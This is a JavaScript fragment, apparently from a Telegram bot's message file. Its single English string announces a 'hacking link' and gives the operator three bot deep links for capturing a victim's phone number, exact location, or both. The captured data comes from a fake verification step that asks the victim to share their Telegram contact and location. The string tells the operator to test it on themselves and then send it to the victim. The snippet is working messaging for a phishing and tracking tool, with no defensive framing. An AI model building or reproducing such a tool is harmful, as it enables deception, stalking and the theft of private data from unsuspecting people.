...
const messages = {
  en: {
    ...
    myInfoMessage: (botUsername, chatId) => `*ʏᴏᴜʀ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n❯ᴜsᴇ ᴛʜɪs ʙᴇʟᴏᴡ ʟɪɴᴋ ᴛᴏ *ʜᴀᴄᴋ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ* ᴏғ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ\n• 📞  https://t.me/${botUsername}?start=free_${chatId}\n\n❯ ᴜsᴇ ᴛʜɪs ʙᴇʟᴏᴡ ʟɪɴᴋ ᴛᴏ ʜᴀᴄᴋ *ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ *ᴏғ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ\n• 🗺  https://t.me/${botUsername}?start=pro_${chatId}\n\n❯ ᴜsᴇ ᴛʜɪs ʙᴇʟᴏᴡ ʟɪɴᴋ ᴛᴏ ʜᴀᴄᴋ *ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ *ᴏғ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ\n• 📞  🗺  https://t.me/${botUsername}?start=ref_${chatId}\n\n❯ ᴛʜᴏsᴇ ᴀʙᴏᴠᴇ ʟɪɴᴋs ᴀʀᴇ ᴛʜᴇ ʙᴏᴛ ʟɪɴᴋs ᴡʜᴇɴ ᴀɴʏᴏɴᴇ sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ ᴠɪᴀ ᴛʜᴏsᴇ ʟɪɴᴋs ᴛʜᴇʏ ᴡɪʟʟ ғᴀᴄᴇ ᴛᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴀɴᴅ ᴀsᴋᴇᴅ ᴛᴏ sʜᴀʀᴇ ᴛʜᴇɪʀ ᴛᴇʟᴇɢʀᴀᴍ ᴄᴏɴᴛᴀᴄᴛ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏᴀᴄᴛɪᴏɴ so ᴛʜᴇɪʀ ᴛᴇʟᴇɢʀᴀᴍ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏᴄᴀᴛɪᴏɴ ᴡɪʟʟ ᴄᴏᴍᴇ ʜᴇʀᴇ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ ᴀғᴛᴇʀ ᴛʜᴇʏ ᴘᴀssᴇᴅ ᴛʜᴇ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ\n❯ ғɪʀsᴛ ᴛᴇsᴛ ᴏɴ ʏᴏᴜʀsᴇʟғ ғᴏʀ ʙᴇᴛᴛᴇʀ ᴜɴᴅᴇʀsᴛᴀɴᴅɪɴɢ ᴏғ ᴜsᴀɢᴇ ᴀɴᴅ ᴛʜᴇɴ sᴇɴᴅ ɪᴛ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ`,
